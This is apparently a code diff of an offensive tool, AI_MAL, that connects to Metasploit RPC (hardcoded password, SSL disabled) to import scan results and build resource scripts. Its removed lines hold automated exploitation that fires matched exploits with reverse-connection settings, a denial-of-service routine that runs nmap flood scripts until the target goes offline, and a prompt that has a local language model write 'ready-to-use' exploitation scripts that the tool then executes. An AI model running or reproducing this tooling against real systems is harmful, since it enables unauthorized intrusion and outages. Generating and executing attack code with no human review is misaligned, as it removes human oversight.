-                        'hostnames': scanner[self.target].get('hostnames', []),
-                        'status': scanner[self.target].get('status', {}),
-                    }
-                    
-                    # Add port information
-                    for proto in scanner[self.target].all_protocols():
-                        for port in scanner[self.target][proto].keys():
-                            port_info = scanner[self.target][proto][port]
-                            result['ports'].append({
-                                'port': port,
-                                'protocol': proto,
-                                'state': port_info.get('state', ''),
-                                'service': port_info.get('name', ''),
-                                'product': port_info.get('product', ''),
-                                'version': port_info.get('version', ''),
-                            })
-                    
-                    self.scan_history.append(result)
-                    self.viewer.scan_summary(self.target, result)
-                    self.logger.info(f"Initial scan complete. Found {len(result['ports'])} open ports.")
-                else:
-                    self.viewer.warning(f"No host found at {self.target} during initial scan.")
-            except Exception as e:
-                self.logger.error(f"Error during initial scan: {str(e)}")
-                self.viewer.error(f"Failed to perform initial scan: {str(e)}")
-        
-        # Try to connect to msfrpcd
         try:
-            # Set a timeout for connection attempts
-            connection_timeout = 10  # seconds
+            self.logger.info("Setting up Metasploit RPC connection...")
+            self.viewer.status("Connecting to Metasploit RPC server...")
             
-            # Display connection info
-            self.viewer.status(f"Trying to connect to msfrpcd at {host}:{port} (timeout: {connection_timeout}s)")
+            # Default Metasploit RPC settings
+            password = "msf_password"  # Default password used in setup
+            host = "127.0.0.1"
+            port = 55553
             
-            # Try to connect with timeout
-            import socket
-            original_timeout = socket.getdefaulttimeout()
-            socket.setdefaulttimeout(connection_timeout)
-            
+            # Try to connect to Metasploit RPC
             try:
-                self.metasploit = MsfRpcClient(
+                self.msf_client = MsfRpcClient(
                     password,
                     server=host,
                     port=port,
-                    ssl=True
+                    ssl=False
                 )
-                self.logger.info("Successfully connected to msfrpcd")
-                self.viewer.success("Connected to Metasploit RPC daemon")
+                
+                # Check connection
+                if self.msf_client.call('core.version')['version']:
+                    self.msf_connected = True
+                    self.logger.info("Successfully connected to Metasploit RPC")
+                    
+                    # Set up workspace
+                    self._setup_msf_workspace()
+                    
+                    return True
             except Exception as e:
-                self.logger.info(f"Could not connect to msfrpcd. Error: {str(e)}")
-                self.viewer.warning(f"Could not connect to msfrpcd: {str(e)}")
+                self.logger.error(f"Error connecting to Metasploit RPC: {e}")
                 
-                # Try to start msfrpcd service
-                self.viewer.status("Starting msfrpcd service...")
+                # Try to start msfrpcd if it's not running
+                self._start_msfrpcd(password, host, port)
+                
+                # Try connecting again
                 try:
-                    # Try both systemd and direct command approaches
-                    if os.path.exists("/etc/systemd/system/msfrpcd.service"):
-                        subprocess.run(["systemctl", "start", "msfrpcd.service"], 
-                                      check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-                        self.viewer.status("Waiting for msfrpcd service to start (via systemd)...")
-                    else:
-                        # Start msfrpcd directly
-                        subprocess.Popen(
-                            ["msfrpcd", "-P", password, "-S", "-a", host, "-p", str(port)],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                            start_new_session=True
-                        )
-                        self.viewer.status("Waiting for msfrpcd service to start (direct launch)...")
+                    self.msf_client = MsfRpcClient(
+                        password,
+                        server=host,
+                        port=port,
+                        ssl=False
+                    )
                     
-                    # Wait for service to start with timeout and feedback
-                    start_time = time.time()
-                    max_wait_time = 15  # seconds
-                    
-                    while time.time() - start_time < max_wait_time:
-                        try:
-                            # Show countdown
-                            remaining = max_wait_time - int(time.time() - start_time)
-                            self.viewer.status(f"Connecting to msfrpcd, timeout in {remaining}s...")
-                            
-                            # Try to connect
-                            self.metasploit = MsfRpcClient(
-                                password,
-                                server=host,
-                                port=port,
-                                ssl=True
-                            )
-                            self.logger.info("Successfully connected to msfrpcd after starting service")
-                            self.viewer.success("Connected to Metasploit RPC daemon")
-                            break
-                        except Exception:
-                            # Wait a bit before trying again
-                            time.sleep(1)
-                    
-                    # If we still couldn't connect after the timeout
-                    if not self.metasploit:
-                        raise Exception(f"Could not connect to msfrpcd after {max_wait_time} seconds")
+                    # Check connection
+                    if self.msf_client.call('core.version')['version']:
+                        self.msf_connected = True
+                        self.logger.info("Successfully connected to Metasploit RPC")
                         
-                except Exception as start_error:
-                    self.logger.error(f"Failed to start msfrpcd service: {str(start_error)}")
-                    self.viewer.error(f"Failed to start msfrpcd service. Try manually with:\nsudo msfrpcd -P {password} -S -a {host} -p {port}")
-                    self.viewer.error("Then restart AI_MAL")
-                    self.msf_integration = False
-                    return
-            finally:
-                # Restore original socket timeout
-                socket.setdefaulttimeout(original_timeout)
-                
-            # Create a workspace if it doesn't exist
-            if self.metasploit:
-                workspaces = self.metasploit.db.workspaces.list
-                if self.msf_workspace not in [w['name'] for w in workspaces]:
-                    self.logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
-                    self.metasploit.db.workspaces.add(self.msf_workspace)
-                    
-                # Select the workspace
-                self.metasploit.db.workspaces.set(self.msf_workspace)
-                self.logger.info(f"Using Metasploit workspace: {self.msf_workspace}")
-                self.viewer.status(f"Using Metasploit workspace: {self.msf_workspace}")
-        
+                        # Set up workspace
+                        self._setup_msf_workspace()
+                        
+                        return True
+                except Exception as e2:
+                    self.logger.error(f"Failed to connect to Metasploit RPC after starting msfrpcd: {e2}")
+            
+            # If we got here, we couldn't connect
+            self.viewer.error("Failed to connect to Metasploit RPC")
+            self.viewer.warning("Metasploit integration will be disabled")
+            self.msf_integration = False
+            return False
+            
         except Exception as e:
-            self.logger.error(f"Error setting up Metasploit: {str(e)}")
-            self.logger.debug(traceback.format_exc())
+            self.logger.error(f"Error setting up Metasploit: {e}")
             self.viewer.error(f"Error setting up Metasploit: {str(e)}")
             self.msf_integration = False
-
-    def process_results_with_metasploit(self, result):
-        """Process scan results with Metasploit to identify exploit opportunities."""
-        if not self.msf_integration or not hasattr(self, 'metasploit'):
-            return
-
-        # If we have scan results but no specific result was passed, use the most recent scan
-        if result is None and hasattr(self, 'scan_history') and self.scan_history:
-            result = self.scan_history[-1]
-            self.logger.info("Using most recent scan results for Metasploit processing")
+            return False
+    
+    def _start_msfrpcd(self, password, host, port):
+        """Try to start the Metasploit RPC daemon."""
+        self.logger.info("Attempting to start Metasploit RPC daemon...")
         
-        if not result:
-            self.logger.warning("No scan results available for Metasploit processing")
-            return
-
-        target = result.get('target', self.target)
-        if not target:
-            self.logger.warning("No target specified for Metasploit processing")
-            return
-
-        self.logger.info(f"Processing scan results for target {target} with Metasploit")
-        self.viewer.status(f"Analyzing {target} for potential exploits...")
-
-        # Import the Metasploit module
         try:
-            from pymetasploit3.msfrpc import MsfRpcClient
-        except ImportError:
-            self.logger.error("Failed to import pymetasploit3.msfrpc")
-            self.viewer.error("Failed to import pymetasploit3.msfrpc module")
-            return
+            # Check if msfrpcd is running using ps
+            ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True)
+            if f"msfrpcd -P {password}" in ps_output:
+                self.logger.info("msfrpcd already running")
+                return
+                
+            # Try to start msfrpcd
+            cmd = [
+                "msfrpcd",
+                "-P", password,
+                "-S",  # No SSL
+                "-a", host,
+                "-p", str(port)
+            ]
             
-        # Initialize discovered services dictionary if not already done
-        if not hasattr(self, 'discovered_services'):
-            self.discovered_services = {}
+            # Start msfrpcd in the background
+            self.logger.info(f"Starting msfrpcd: {' '.join(cmd)}")
+            subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                start_new_session=True
+            )
             
-        try:
-            # Extract hostnames if available
-            hostname = 'unknown'
-            if 'hostnames' in result and result['hostnames']:
-                if isinstance(result['hostnames'], list):
-                    hostname = result['hostnames'][0].get('name', 'unknown')
-                else:
-                    hostname = str(result['hostnames'])
-                    
-            # Add host to database
+            # Give it time to start
+            self.logger.info("Waiting for msfrpcd to start...")
+            time.sleep(5)
+            
+        except Exception as e:
+            self.logger.error(f"Error starting msfrpcd: {e}")
+            
+            # Try alternative - using systemctl
             try:
-                self.metasploit.db.hosts.report(target, name=hostname)
-                self.logger.info(f"Added host {target} to Metasploit database")
+                self.logger.info("Trying to start msfrpcd using systemctl...")
+                subprocess.run(
+                    ["systemctl", "start", "msfrpcd"],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    check=True
+                )
+                time.sleep(5)
+            except Exception as e2:
+                self.logger.error(f"Error starting msfrpcd using systemctl: {e2}")
+    
+    def _setup_msf_workspace(self):
+        """Set up Metasploit workspace."""
+        if not self.msf_connected or not self.msf_client:
+            return
+            
+        try:
+            # Get list of workspaces
+            workspaces = self.msf_client.call('db.workspaces')
+            
+            # Check if our workspace exists
+            workspace_exists = False
+            for ws in workspaces['workspaces']:
+                if ws['name'] == self.msf_workspace:
+                    workspace_exists = True
+                    break
+            
+            # Create workspace if it doesn't exist
+            if not workspace_exists:
+                self.logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
+                self.msf_client.call('db.add_workspace', [self.msf_workspace])
+            
+            # Set current workspace
+            self.logger.info(f"Setting Metasploit workspace to: {self.msf_workspace}")
+            self.msf_client.call('db.set_workspace', [self.msf_workspace])
+            
+        except Exception as e:
+            self.logger.error(f"Error setting up Metasploit workspace: {e}")
+    
+    def process_results_with_metasploit(self, result):
+        """Process scan results with Metasploit to import hosts and services."""
+        if not self.msf_connected or not self.msf_client or not result:
+            return
+            
+        try:
+            self.logger.info("Processing scan results with Metasploit...")
+            
+            # Check if target is in scan results
+            if 'scan' not in result or self.target not in result['scan']:
+                self.logger.warning(f"Target {self.target} not found in scan results")
+                return
+                
+            target_info = result['scan'][self.target]
+            
+            # Import host
+            host_data = {
+                'host': self.target,
+                'state': 'alive',
+                'name': '',
+                'os_name': '',
+                'os_flavor': '',
+                'os_sp': '',
+                'os_lang': '',
+                'arch': '',
+                'mac': '',
+                'scope': self.msf_workspace
+            }
+            
+            # Add hostname if available
+            if 'hostnames' in target_info and target_info['hostnames']:
+                host_data['name'] = target_info['hostnames'][0].get('name', '')
+                
+            # Add OS info if available
+            if 'osmatch' in target_info and target_info['osmatch']:
+                os_match = target_info['osmatch'][0]
+                host_data['os_name'] = os_match.get('name', '').split()[0]  # Get first word as OS name
+                host_data['os_flavor'] = ' '.join(os_match.get('name', '').split()[1:])  # Rest as flavor
+                
+            # Import the host
+            try:
+                host_id = self.msf_client.call('db.report_host', [host_data])
+                self.logger.debug(f"Imported host {self.target} with ID {host_id}")
             except Exception as e:
-                self.logger.warning(f"Error adding host to Metasploit: {str(e)}")
-                
-            # Process open ports
-            if 'ports' in result and result['ports']:
-                self.viewer.status(f"Found {len(result['ports'])} ports to analyze")
-                
-                for port_data in result['ports']:
-                    if port_data.get('state') == 'open':
-                        port = port_data.get('port')
-                        protocol = port_data.get('protocol', 'tcp')
-                        service = port_data.get('service', 'unknown')
-                        product = port_data.get('product', '')
-                        version = port_data.get('version', '')
-                        
-                        # Add service to database
-                        try:
-                            self.metasploit.db.services.report(
-                                target, 
-                                port=int(port),
-                                proto=protocol,
-                                name=service,
-                                info=f"{product} {version}".strip()
-                            )
-                            self.logger.info(f"Added service {service} on {port}/{protocol} to Metasploit database")
-
-                            # Add to discovered services
-                            port_key = f"{port}/{protocol}"
-                            self.discovered_services[port_key] = {
-                                "service": service,
-                                "product": product,
-                                "version": version,
-                                "exploited": False
+                self.logger.error(f"Error importing host to Metasploit: {e}")
+            
+            # Import services
+            for proto in ['tcp', 'udp']:
+                if proto in target_info:
+                    for port, port_data in target_info[proto].items():
+                        if port_data['state'] == 'open':
+                            service_data = {
+                                'host': self.target,
+                                'port': int(port),
+                                'proto': proto,
+                                'state': 'open',
+                                'name': port_data.get('name', ''),
+                                'info': '',
                             }
-                        except Exception as e:
-                            self.logger.warning(f"Error adding service to Metasploit: {str(e)}")
-            else:
-                self.viewer.warning("No open ports found in scan results")
-                
-            # If auto-exploit enabled, find matching exploits
+                            
+                            # Add version info if available
+                            if 'product' in port_data and port_data['product']:
+                                service_info = port_data['product']
+                                if 'version' in port_data and port_data['version']:
+                                    service_info += f" {port_data['version']}"
+                                service_data['info'] = service_info
+                            
+                            # Import the service
+                            try:
+                                service_id = self.msf_client.call('db.report_service', [service_data])
+                                self.logger.debug(f"Imported service {port}/{proto} on {self.target} with ID {service_id}")
+                            except Exception as e:
+                                self.logger.error(f"Error importing service to Metasploit: {e}")
+            
+            self.logger.info("Successfully imported scan results to Metasploit")
+            
+            # Run exploits if enabled
             if self.exploit:
                 self.find_matching_exploits()
                 
-            # If auto-script enabled, generate and run resource script
-            if self.auto_script and hasattr(self, 'matching_exploits') and self.matching_exploits:
-                script_path = self.generate_resource_script()
-                if script_path:
-                    self.run_resource_script(script_path)
-                    
         except Exception as e:
-            self.logger.error(f"Error processing results with Metasploit: {str(e)}")
-            import traceback
-            self.logger.debug(traceback.format_exc())
-
+            self.logger.error(f"Error processing results with Metasploit: {e}")
+    
     def find_matching_exploits(self):
-        """Find matching exploits for discovered services."""
-        if not self.metasploit or not self.discovered_services:
+        """Find matching exploits for the target's open services."""
+        if not self.msf_connected or not self.msf_client:
             return
-        
-        logger.info("Finding matching exploits for discovered services...")
-        
-        for port_key, service_info in self.discovered_services.items():
-            service = service_info['service']
-            product = service_info['product']
-            version = service_info['version']
             
-            if service == 'unknown':
-                continue
-            
-            search_terms = []
-            
-            # Different search strategies based on service
-            if product:
-                # Search by product and version if available
-                search_terms.append(f"{product} {version}".strip())
-                search_terms.append(product)
-            
-            # Always include service name
-            search_terms.append(service)
-            
-            # Common services have special searches
-            if service in ['http', 'https', 'www']:
-                search_terms.append('web')
-            elif service in ['smb', 'microsoft-ds']:
-                search_terms.extend(['smb', 'windows', 'microsoft'])
-            elif service in ['ssh', 'openssh']:
-                search_terms.extend(['ssh', 'openssh'])
-            elif service in ['ftp']:
-                search_terms.extend(['ftp', 'file transfer'])
-            
-            # Search for each term
-            exploits = set()
-            for term in search_terms:
-                try:
-                    search_result = self.metasploit.modules.search(term)
-                    for exploit in search_result:
-                        # Check if it's a usable exploit or auxiliary module
-                        if exploit['type'] in ['exploit', 'auxiliary'] and 'path' in exploit:
-                            exploits.add(exploit['path'])
-                except Exception as e:
-                    logger.warning(f"Error searching for exploits: {str(e)}")
-            
-            # Store matching exploits
-            if exploits:
-                self.matching_exploits[port_key] = list(exploits)
-                logger.info(f"Found {len(exploits)} potential exploits for {service} on {port_key}")
-            else:
-                logger.info(f"No exploits found for {service} on {port_key}")
-        
-        # Log total exploits found
-        total_exploits = sum(len(exploits) for exploits in self.matching_exploits.values())
-        logger.info(f"Found a total of {total_exploits} potential exploits across all services")
-
-    def generate_resource_script(self):
-        """Generate a Metasploit resource script for automated exploitation."""
-        if not self.matching_exploits:
-            logger.info("No matching exploits to generate resource script")
-            return None
-        
         try:
-            # Create a timestamp for the script name
-            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            script_name = f"auto_exploit_{timestamp}.rc"
+            self.logger.info(f"Finding matching exploits for {self.target}...")
+            self.viewer.status(f"Finding matching exploits for {self.target}...")
             
-            logger.info(f"Generating Metasploit resource script: {script_name}")
+            # Get host services
+            services = self.msf_client.call('db.services', [{'workspace': self.msf_workspace, 'host': self.target}])
             
-            with open(script_name, 'w') as f:
-                f.write(f"# Auto-generated Metasploit resource script for {self.target}\n")
-                f.write(f"# Generated: {timestamp}\n\n")
+            # Check if we have services
+            if not services or 'services' not in services or not services['services']:
+                self.logger.warning(f"No services found for {self.target}")
+                return
                 
-                # Set workspace
-                f.write(f"workspace {self.msf_workspace}\n\n")
+            # Extract service information
+            target_services = []
+            for service in services['services']:
+                if service['state'] == 'open':
+                    service_info = {
+                        'port': service['port'],
+                        'proto': service['proto'],
+                        'name': service['name'],
+                        'info': service['info']
+                    }
+                    target_services.append(service_info)
+            
+            self.logger.info(f"Found {len(target_services)} open services on {self.target}")
+            
+            # If we should automatically run exploits
+            if self.exploit:
+                self.run_exploits_on_host(self.target)
+            else:
+                # Generate a Metasploit resource script
+                script_path = self.generate_resource_script()
                 
-                # Try each exploit for each service
-                for port_key, exploits in self.matching_exploits.items():
-                    port, protocol = port_key.split('/')
-                    service_info = self.discovered_services[port_key]
-                    service = service_info['service']
+                if script_path:
+                    self.viewer.script_generation_summary(
+                        script_path,
+                        "Metasploit Resource Script",
+                        f"Resource script for exploiting {self.target}"
+                    )
                     
-                    f.write(f"# Exploits for {service} on port {port}/{protocol}\n")
-                    
-                    # Limit to top 3 exploits per service to avoid taking too long
-                    for exploit in exploits[:3]:
-                        f.write(f"use {exploit}\n")
-                        f.write(f"set RHOSTS {self.target}\n")
-                        f.write(f"set RPORT {port}\n")
-                        
-                        # Set common options
-                        f.write("set LHOST 0.0.0.0\n")  # This will be replaced with actual local IP
-                        f.write("set LPORT 4444\n")
-                        
-                        # Run exploit with default options
-                        f.write("exploit -z\n")
-                        
-                        # Pause between exploits
-                        f.write("sleep 3\n\n")
-                
-                # Final commands
-                f.write("sessions -l\n")
-                f.write("# End of script\n")
+                    # Run the script if execute_scripts is enabled
+                    if self.execute_scripts:
+                        result = self.run_resource_script(script_path)
+                        if result:
+                            self.viewer.success(f"Successfully executed resource script: {script_path}")
+                        else:
+                            self.viewer.warning(f"Failed to execute resource script: {script_path}")
             
-            # Record the script
-            self.generated_scripts.append(script_name)
-            logger.info(f"Generated resource script: {script_name}")
-            
-            return script_name
-        
         except Exception as e:
-            logger.error(f"Error generating resource script: {str(e)}")
-            logger.debug(traceback.format_exc())
+            self.logger.error(f"Error finding matching exploits: {e}")
+    
+    def generate_resource_script(self):
+        """Generate a Metasploit resource script for the target."""
+        if not self.msf_connected or not self.msf_client:
             return None
-
+            
+        try:
+            self.logger.info(f"Generating Metasploit resource script for {self.target}...")
+            
+            # Get host services
+            services = self.msf_client.call('db.services', [{'workspace': self.msf_workspace, 'host': self.target}])
+            
+            # Check if we have services
+            if not services or 'services' not in services or not services['services']:
+                self.logger.warning(f"No services found for {self.target}")
+                return None
+                
+            # Create script directory if it doesn't exist
+            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
+            os.makedirs(script_dir, exist_ok=True)
+            
+            # Generate script filename
+            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+            script_path = os.path.join(script_dir, f"metasploit_{self.target.replace('.', '_')}_{timestamp}.rc")
+            
+            # Get local IP to use for payload
+            local_ip = self._get_local_ip()
+            
+            # Generate resource script content
+            content = [
+                f"# Metasploit resource script for {self.target}",
+                f"# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+                "",
+                f"workspace {self.msf_workspace}",
+                "",
+                "# Set global variables",
+                f"setg RHOSTS {self.target}",
+                f"setg LHOST {local_ip}",
+                "setg LPORT 4444",
+                "",
+                "# Scan modules"
+            ]
+            
+            # Add scan modules
+            for service in services['services']:
+                if service['state'] == 'open':
+                    port = service['port']
+                    proto = service['proto']
+                    name = service['name']
+                    
+                    content.append(f"# Port {port}/{proto} - {name}")
+                    
+                    # Add scanner modules based on service
+                    if name == 'ssh':
+                        content.append(f"use auxiliary/scanner/ssh/ssh_version")
+                        content.append(f"set RHOSTS {self.target}")
+                        content.append(f"set RPORT {port}")
+                        content.append("run")
+                    elif name == 'http' or name == 'https':
+                        content.append(f"use auxiliary/scanner/http/http_version")
+                        content.append(f"set RHOSTS {self.target}")
+                        content.append(f"set RPORT {port}")
+                        content.append("run")
+                    elif name == 'smb' or name == 'microsoft-ds':
+                        content.append(f"use auxiliary/scanner/smb/smb_version")
+                        content.append(f"set RHOSTS {self.target}")
+                        content.append(f"set RPORT {port}")
+                        content.append("run")
+                    elif name == 'ftp':
+                        content.append(f"use auxiliary/scanner/ftp/ftp_version")
+                        content.append(f"set RHOSTS {self.target}")
+                        content.append(f"set RPORT {port}")
+                        content.append("run")
+                    
+                    content.append("")
+            
+            # Add exploit modules section
+            content.append("# Exploit modules")
+            
+            # Add resource script footer
+            content.append("")
+            content.append("# End of resource script")
+            
+            # Write to file
+            with open(script_path, "w") as f:
+                f.write("\n".join(content))
+                
+            self.logger.info(f"Generated resource script: {script_path}")
+            return script_path
+            
+        except Exception as e:
+            self.logger.error(f"Error generating resource script: {e}")
+            return None
+    
     def run_resource_script(self, script_path):
         """Run a Metasploit resource script."""
         if not os.path.exists(script_path):
-            logger.error(f"Resource script not found: {script_path}")
-            return
-        
+            self.logger.error(f"Resource script not found: {script_path}")
+            return False
+            
         try:
-            logger.info(f"Running Metasploit resource script: {script_path}")
-            
-            # Update LHOST in script with local IP
-            with open(script_path, 'r') as f:
-                content = f.read()
-            
-            local_ip = self._get_local_ip()
-            if local_ip:
-                content = content.replace("set LHOST 0.0.0.0", f"set LHOST {local_ip}")
-                
-                with open(script_path, 'w') as f:
-                    f.write(content)
+            self.logger.info(f"Running resource script: {script_path}")
+            self.viewer.status(f"Running Metasploit resource script: {os.path.basename(script_path)}")
             
             # Run msfconsole with resource script
-            command = f"msfconsole -q -r {script_path}"
-            logger.info(f"Executing: {command}")
-            
-            # Run in background to avoid blocking
-            process = subprocess.Popen(
-                command,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            
-            # Wait a bit to see if it starts
-            time.sleep(2)
-            logger.info(f"Started Metasploit process with PID: {process.pid}")
-            
-            # Don't wait for completion to avoid blocking the script
-            # This means the script will continue running in background
-        
-        except Exception as e:
-            logger.error(f"Error running resource script: {str(e)}")
-            logger.debug(traceback.format_exc())
-
-    def run_exploits_on_host(self, target):
-        """Run all matching exploits against a host."""
-        if not self.metasploit or not self.matching_exploits:
-            return
-        
-        self.logger.info(f"Running exploits against target: {target}")
-        self.viewer.header(f"EXPLOITATION PHASE: {target}", "=")
-        
-        # Run each exploit through resource script
-        script_path = self.generate_resource_script()
-        if script_path:
-            self.run_resource_script(script_path)
-            
-            # Mark all services as exploitation attempted
-            for port_key in self.matching_exploits.keys():
-                if port_key in self.discovered_services:
-                    self.discovered_services[port_key]['exploitation_attempted'] = True
-            
-            # Collect exploitation results for summary
-            exploit_results = {
-                'total_attempts': sum(len(exploits) for exploits in self.matching_exploits.values()),
-                'successful': 0,  # This would need to be updated based on actual results
-                'details': self.matching_exploits
-            }
-            
-            self.viewer.exploit_summary(target, exploit_results)
-
-    def _get_local_ip(self):
-        """Get the local IP address."""
-        try:
-            # First try to get the interface for the default route
-            if self.network_discovery:
-                return self.network_discovery.get_interface_info().get('addr')
-            
-            # Fallback method
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-            return local_ip
-        except:
-            self.logger.warning("Could not determine local IP address")
-            return "127.0.0.1"
-
-    def perform_dos_attack(self, target):
-        """Perform Denial of Service attacks against the target."""
-        if not self.dos_attack:
-            return False
-            
-        self.logger.info(f"Attempting DoS attack against {target}")
-        self.viewer.header(f"DENIAL OF SERVICE ATTACK: {target}", "=")
-        
-        try:
-            # Check if network_discovery is properly initialized
-            if not self.network_discovery:
-                self.logger.error("Network discovery is not initialized")
-                self.viewer.error("Cannot perform DoS attack: Network discovery is not initialized")
-                return False
-                
-            # First, check if the target is still up
-            if not self.network_discovery.ping_host(target):
-                self.logger.warning(f"Target {target} is already unreachable")
-                self.viewer.warning(f"Target {target} is already unreachable")
-                return False
-                
-            # Use nmap's DoS-related scripts
-            self.logger.info("Using nmap scripts for DoS testing")
-            dos_scripts = [
-                "http-slowloris",
-                "smb-dos",
-                "ipv6-ra-flood", 
-                "dns-flood"
+            cmd = [
+                "msfconsole",
+                "-q",  # Quiet mode
+                "-r", script_path
             ]
             
-            for script in dos_scripts:
-                script_cmd = f"nmap -Pn -p- --script={script} {target}"
-                if self.stealth:
-                    script_cmd += " -T2"
-                
-                self.logger.info(f"Running DoS script: {script}")
-                self.viewer.status(f"Testing vulnerability to {script} attack...")
-                
-                try:
-                    process = subprocess.Popen(
-                        script_cmd.split(),
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        text=True
-                    )
-                    # Let it run for a few seconds before checking target status
-                    time.sleep(5)
-                    
-                    # Check if target is still responding
-                    if not self.network_discovery.ping_host(target):
-                        self.logger.info(f"Target {target} is now unreachable - DoS appears successful")
-                        self.viewer.dos_attack_summary(target, True, script)
-                        
-                        # Terminate the process as we've achieved the goal
-                        process.terminate()
-                        return True
-                    
-                    # If still up after 10 seconds, let it run up to 30 seconds total
-                    time.sleep(25)
-                    process.terminate()
-                    
-                    # Final check if target is still responding
-                    if not self.network_discovery.ping_host(target):
-                        self.logger.info(f"Target {target} is now unreachable after extended attack")
-                        self.viewer.dos_attack_summary(target, True, script)
-                        return True
-                        
-                except Exception as e:
-                    self.logger.error(f"Error during DoS attack with {script}: {str(e)}")
-                    
-            # If we get here, none of the scripts worked
-            self.logger.warning(f"All DoS attacks failed to take down {target}")
-            self.viewer.dos_attack_summary(target, False)
-            
-            # If custom scripts are enabled, try generating a DoS script
-            if self.custom_scripts:
-                self.logger.info("Attempting to generate a custom DoS script")
-                self.viewer.status("Generating custom DoS script...")
-                
-                script_path = self.generate_custom_script(
-                    script_type=self.script_type,
-                    target_info={"target": target, "purpose": "dos_attack"}
-                )
-                
-                if script_path and self.execute_scripts:
-                    self.logger.info(f"Executing custom DoS script: {script_path}")
-                    self.viewer.status(f"Executing custom DoS script...")
-                    
-                    success = self.execute_generated_script(script_path, [target])
-                    
-                    # Check if target is still up after custom script
-                    if not self.network_discovery.ping_host(target):
-                        self.logger.info(f"Target {target} is now unreachable after custom DoS script")
-                        self.viewer.dos_attack_summary(target, True, "Custom Script")
-                        return True
-            
-            return False
-                
-        except Exception as e:
-            self.logger.error(f"Error performing DoS attack: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            self.viewer.error(f"Error performing DoS attack: {str(e)}")
-            return False
-
-    def generate_custom_script(self, script_type="bash", target_info=None):
-        """
-        Generate a custom script based on scan results using Ollama
-        
-        Args:
-            script_type (str): Type of script to generate (bash, python, ruby)
-            target_info (dict): Target information to use for script generation
-            
-        Returns:
-            str: Path to the generated script
-        """
-        if not self.custom_scripts:
-            self.logger.warning("Custom script generation is disabled")
-            return None
-            
-        self.logger.info(f"Generating custom {script_type} script based on scan results")
-        self.viewer.status(f"Generating custom {script_type} script...")
-        
-        # Use target_info if provided, otherwise use the current target
-        if target_info is None:
-            current_target = self.target
-            target_info = self.summarize_results(self.run_nmap_scan(self.generate_scan_parameters(1)))
-        
-        # Prepare data for the model
-        scan_summary = json.dumps(target_info, indent=2)
-        
-        # Construct the prompt
-        prompt = f"""
-        You are a cybersecurity expert writing custom scripts for reconnaissance and analysis.
-        
-        Based on the following scan results, create a useful {script_type} script that could help a security professional
-        analyze this system further or extract more information. Include detailed comments and a clear summary at the beginning.
-        Make sure to start the script with a clear description of what it does in a comment section titled "SCRIPT SUMMARY".
-        
-        Scan Results:
-        {scan_summary}
-        
-        Create a complete, ready-to-use {script_type} script that is useful for further analysis or exploitation.
-        """
-        
-        try:
-            # Prepare model
-            self.logger.debug(f"Calling Ollama model: {self.ollama_model}")
-            
-            # Show live generation to the user for better transparency
-            script_content = self.call_ollama(prompt, stream=self.show_live_ai)
-            
-            if not script_content:
-                self.logger.error("Failed to generate script content")
-                self.viewer.error("Failed to generate script content")
-                return None
-                
-            # Extract code block if present
-            code_pattern = r"```(?:\w+)?\s*([\s\S]*?)```"
-            code_match = re.search(code_pattern, script_content)
-            if code_match:
-                script_content = code_match.group(1).strip()
-            
-            # Create output directory if it doesn't exist
-            os.makedirs("generated_scripts", exist_ok=True)
-            
-            # Determine file extension
-            extension = {
-                "bash": "sh",
-                "python": "py",
-                "ruby": "rb"
-            }.get(script_type.lower(), "txt")
-            
-            # Generate a filename
-            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            target_str = self.target.replace('.', '_').replace(':', '_')
-            script_filename = f"generated_scripts/{script_type}_{target_str}_{timestamp}.{extension}"
-            
-            # Write the script to file
-            with open(script_filename, "w") as f:
-                f.write(script_content)
-            
-            # Make the script executable
-            if script_type.lower() != "python":
-                os.chmod(script_filename, os.stat(script_filename).st_mode | stat.S_IEXEC)
-            
-            self.logger.info(f"Custom script generated: {script_filename}")
-            
-            # Extract summary from the script
-            summary_pattern = r"SCRIPT SUMMARY[:\s]*(.*?)(?:\n\n|\n#|\n$)"
-            summary_match = re.search(summary_pattern, script_content, re.IGNORECASE | re.DOTALL)
-            
-            summary = "No summary available"
-            if summary_match:
-                summary = summary_match.group(1).strip()
-                # Clean up the summary (remove comment marks and extra whitespace)
-                summary = re.sub(r'^#\s*', '', summary, flags=re.MULTILINE)
-                summary = re.sub(r'\n\s*#\s*', ' ', summary)
-                summary = re.sub(r'\s+', ' ', summary).strip()
-            
-            # Display summary to console using the viewer
-            self.viewer.script_generation_summary(script_filename, script_type, summary)
-            
-            return script_filename
-        except Exception as e:
-            self.logger.error(f"Error generating custom script: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            self.viewer.error(f"Error generating custom script: {str(e)}")
-            return None
-
-    def execute_generated_script(self, script_path, args=None):
-        """
-        Execute a generated script
-        
-        Args:
-            script_path (str): Path to the script to execute
-            args (list): Optional arguments to pass to the script
-            
-        Returns:
-            bool: True if successful, False otherwise
-        """
-        if not self.execute_scripts:
-            self.logger.warning("Script execution is disabled")
-            return False
-            
-        if not script_path or not os.path.exists(script_path):
-            self.logger.error(f"Script not found: {script_path}")
-            return False
-            
-        try:
-            # Determine how to execute based on file extension
-            extension = os.path.splitext(script_path)[1].lower()
-            
-            cmd = []
-            if extension == '.py':
-                cmd = ['python3', script_path]
-            elif extension in ['.sh', '.bash']:
-                cmd = ['bash', script_path]
-            elif extension == '.rb':
-                cmd = ['ruby', script_path]
-            else:
-                # Default to direct execution if it's executable
-                cmd = [script_path]
-                
-            # Add any arguments
-            if args:
-                if isinstance(args, list):
-                    cmd.extend(args)
